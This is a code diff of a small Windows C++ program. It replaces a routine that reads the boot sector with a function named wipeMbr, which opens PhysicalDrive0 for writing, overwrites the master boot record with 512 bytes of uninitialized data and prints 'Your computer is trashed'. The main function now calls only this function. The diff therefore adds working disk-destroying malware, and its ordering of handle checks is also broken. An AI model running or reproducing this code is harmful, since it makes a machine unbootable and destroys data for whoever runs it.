@@ -2,39 +2,40 @@
 #include <stdio.h>
 #include <iostream>
 
+#define MBR_DATA 512
+
 using namespace std;
 
-short ReadSect
-        (const char *_dsk,    // disk to access
-         char *&_buff,         // buffer where sector will be stored
-         unsigned int _nsect   // sector number, starting with 0
-        ) {
-    DWORD dwRead;
-    HANDLE hDisk = CreateFile(_dsk, GENERIC_READ, FILE_SHARE_VALID_FLAGS, nullptr, OPEN_EXISTING, 0, 0);
-    if (hDisk == INVALID_HANDLE_VALUE) // this may happen if another program is already reading from disk
-    {
-        CloseHandle(hDisk);
-        return 1;
-    }
-    SetFilePointer(hDisk, _nsect * 512, nullptr, FILE_BEGIN); // which sector to read
 
-    ReadFile(hDisk, _buff, 512, &dwRead, 0);  // read sector
-    CloseHandle(hDisk);
-    return 0;
+void wipeMbr() {
+    DWORD dwBytesReturned;
+    char mbrData[MBR_DATA];
+    HANDLE masterBootRecord = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
+                                         FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
+                                         OPEN_EXISTING, NULL, NULL);
+
+    if (WriteFile(masterBootRecord, mbrData, MBR_DATA,
+                  &dwBytesReturned, NULL) == TRUE) {
+        cout << "MBR is wiped. Your computer is trashed" << endl;
+        Sleep(5000);
+        ExitProcess(0);
+    } else {
+        cout << "MBR is not wiped. Your computer is not trashed :(" << endl;
+    }
+
+    if (masterBootRecord == INVALID_HANDLE_VALUE) {
+        printf("Error: CreateFile failed\n");
+        return;
+    }
+    if (!DeviceIoControl(masterBootRecord, 0x0007c088, NULL, 0, mbrData, 512, &dwBytesReturned, NULL)) {
+        printf("Error: DeviceIoControl failed\n");
+        return;
+    }
+    CloseHandle(masterBootRecord);
+
 }
 
 int main() {
-//    char *drv = "\\\\.\\C:";
-    char *dsk = new char[20];
-    strcpy(dsk, R"(\\.\PhysicalDrive0)");
-    int sector = 0;
-
-    char *buff = new char[512];
-    ReadSect(dsk, buff, sector);
-    if ((unsigned char) buff[510] == 0x55 && (unsigned char) buff[511] == 0xaa) cout << "Disk is bootable!" << endl;
-
-
-    // getchar();
+    wipeMbr();
     return 0;
-
 }
